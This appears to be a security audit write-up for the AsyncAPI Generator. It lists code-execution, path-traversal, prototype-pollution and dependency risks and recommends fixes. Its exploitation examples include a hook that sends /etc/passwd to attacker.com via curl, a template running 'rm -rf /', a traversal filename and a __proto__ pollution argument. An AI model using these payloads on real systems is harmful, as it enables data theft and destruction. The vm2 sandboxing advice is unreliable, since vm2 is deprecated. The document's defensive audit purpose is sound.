# Technical Security Analysis: AsyncAPI Generator

## Code Execution Attack Vectors

### 1. Template Hook Execution Chain

```javascript
// apps/generator/lib/hooksRegistry.js:44
delete require.cache[require.resolve(filePath)];
const mod = require(filePath);
```

**Vulnerability Details:**
- Direct `require()` of user-controlled files
- No sandboxing or validation
- Executed with full Node.js privileges
- Can access filesystem, network, and system APIs

**Exploitation Example:**
```javascript
// Malicious hook file
const { exec } = require('child_process');
module.exports = {
  "generator:after": () => {
    exec('curl -X POST https://attacker.com/exfil -d "$(cat /etc/passwd)"');
  }
};
```

### 2. NPM Package Installation Attack Vector

```javascript
// apps/generator/lib/generator.js:617
const installResult = await arb.reify({
  add: [this.templateName],  // User-controlled
  saveType: 'prod',
  save: false
});
```

**Vulnerability Details:**
- Automatically installs npm packages based on user input
- No verification of package authenticity
- Executes install scripts with full privileges
- Vulnerable to typosquatting and dependency confusion

**Exploitation Scenarios:**
1. **Typosquatting**: Register `@asyncapi/html-tempiate` (misspelled) with malicious code
2. **Package takeover**: Compromise legitimate template packages
3. **Dependency confusion**: Upload internal package names to public registry

### 3. React Component Execution

```typescript
// apps/react-sdk/src/renderer/template.ts:60
delete require.cache[require.resolve(componentPath)];
const component = require(componentPath);
```

**Vulnerability Details:**
- Dynamic import of React components from templates
- No code validation or sandboxing
- Can execute arbitrary JavaScript within template context

**Exploitation Example:**
```javascript
// Malicious React template
export default ({ asyncapi, params }) => {
  require('child_process').exec('rm -rf /');
  return null;
};
```

## Path Traversal Vulnerabilities

### 1. File Writing Operations

```javascript
// apps/generator/lib/generator.js:854
const targetFile = path.resolve(this.targetDir, relativeBaseDir, newFileName);
```

**Vulnerability Details:**
- Insufficient validation of file paths
- Can be exploited to write files outside target directory
- `filenamify()` sanitization can be bypassed

**Exploitation Example:**
```
Template filename: "../../../etc/passwd"
Result: Overwrites system files
```

### 2. Template Directory Traversal

**Locations:**
- `apps/generator/lib/generator.js:730-731`
- `apps/generator/lib/generator.js:792-793`

**Attack Vectors:**
- Symlink attacks in template directories
- Directory traversal in template file paths
- Overwriting generator source files

## Input Validation Failures

### 1. CLI Parameter Injection

```javascript
// apps/generator/cli.js:29
const [paramName, paramValue] = v.split(/=(.+)/, 2);
params[paramName] = paramValue;
```

**Vulnerability Details:**
- No validation of parameter names or values
- Parameters passed directly to templates
- Can be used for prototype pollution

**Exploitation Example:**
```bash
asyncapi-generator --param "__proto__.polluted=true" spec.yaml template
```

### 2. URL Parameter Manipulation

```javascript
// apps/generator/cli.js:56
mapBaseUrlToFolder.url = mapping[1].replace(/\/$/, '');
mapBaseUrlToFolder.folder = path.resolve(mapping[2]);
```

**Vulnerability Details:**
- Basic URL validation but no SSRF protection
- Could be used to access internal resources
- File path resolution without traversal protection

## Dependency Chain Vulnerabilities

### Critical Dependencies with Known Vulnerabilities

1. **jsonpath-plus <=10.2.0**
   - CVE: Remote Code Execution
   - Impact: Complete system compromise
   - Used in: AsyncAPI Parser

2. **lodash.template**
   - CVE: Command Injection
   - Impact: Arbitrary code execution
   - Used in: Build tools

3. **braces <3.0.3**
   - CVE: ReDoS (Regular Expression Denial of Service)
   - Impact: Resource exhaustion
   - Used in: File pattern matching

## Container Security Analysis

### Dockerfile Security Issues

```dockerfile
# Security hotspot - copies entire project
COPY . .
```

**Analysis:**
- Copies entire project context (including sensitive files)
- Marked as security hotspot in SonarQube
- Risk of exposing sensitive development files

**Mitigations Implemented:**
- Multi-stage build to reduce final image size
- Non-root user execution
- Specific file copying in final stage

## Network Security Concerns

### 1. Template Fetching Over Network

```javascript
// apps/generator/lib/utils.js:89
utils.fetchSpec = (link) => {
  return fetch(link).then(res => res.text());
};
```

**Vulnerabilities:**
- No HTTPS enforcement
- No certificate validation options
- Potential SSRF if internal URLs allowed
- No timeout or size limits

### 2. NPM Registry Access

**Security Concerns:**
- Default public npm registry access
- No package signature verification
- Vulnerable to man-in-the-middle attacks
- Registry credentials in configuration

## Template Security Model

### Current Security Boundaries

1. **File System Access**: Full access to target directory and template directory
2. **Network Access**: Full outbound network access
3. **System Access**: Full Node.js API access
4. **Process Access**: Can spawn child processes

### Missing Security Controls

1. **No Sandboxing**: Templates execute with full privileges
2. **No Resource Limits**: No CPU, memory, or execution time limits
3. **No Network Restrictions**: No egress filtering
4. **No File System Restrictions**: No path validation or access controls

## Prototype Pollution Vectors

### Template Parameter Pollution

```javascript
// Potential pollution through template parameters
params["__proto__"]["isAdmin"] = true;
```

### AsyncAPI Document Pollution

- Malicious AsyncAPI documents could pollute object prototypes
- Affects template rendering and generation logic
- Could lead to privilege escalation

## Security Recommendations Implementation Guide

### 1. Implement Template Sandboxing

```javascript
// Recommended approach using VM2
const { VM } = require('vm2');

const vm = new VM({
  timeout: 1000,
  sandbox: {
    // Restricted sandbox environment
  },
  require: {
    external: false, // Disable external module loading
    builtin: ['path'], // Only allow specific built-in modules
  }
});

const result = vm.run(templateCode);
```

### 2. Add Path Validation

```javascript
// Secure path validation
function validatePath(targetDir, filePath) {
  const resolvedPath = path.resolve(targetDir, filePath);
  const relativePath = path.relative(targetDir, resolvedPath);
  
  if (relativePath.startsWith('../') || path.isAbsolute(relativePath)) {
    throw new Error('Path traversal detected');
  }
  
  return resolvedPath;
}
```

### 3. Implement Package Verification

```javascript
// Package signature verification
async function verifyPackage(packageName) {
  // Check package signatures
  // Verify against trusted registry
  // Validate package integrity
}
```

## Security Testing Recommendations

### 1. Static Analysis Tools
- ESLint with security rules
- Semgrep for security patterns
- CodeQL for vulnerability detection

### 2. Dynamic Analysis
- Template fuzzing with malicious payloads
- Path traversal testing
- Injection payload testing

### 3. Dependency Scanning
- npm audit (already in use)
- Snyk or similar tools
- Regular dependency updates

## Monitoring and Detection

### Security Events to Monitor
1. Template installation events
2. File system access outside target directory
3. Network requests from templates
4. Process spawning from templates
5. Unusual CPU/memory usage patterns

### Logging Recommendations
```javascript
// Security event logging
logger.security('template_execution', {
  templateName,
  targetDir,
  timestamp,
  userId,
  fileOperations: []
});
```

This technical analysis provides the detailed implementation guidance needed to address the security vulnerabilities identified in the main attack surface analysis.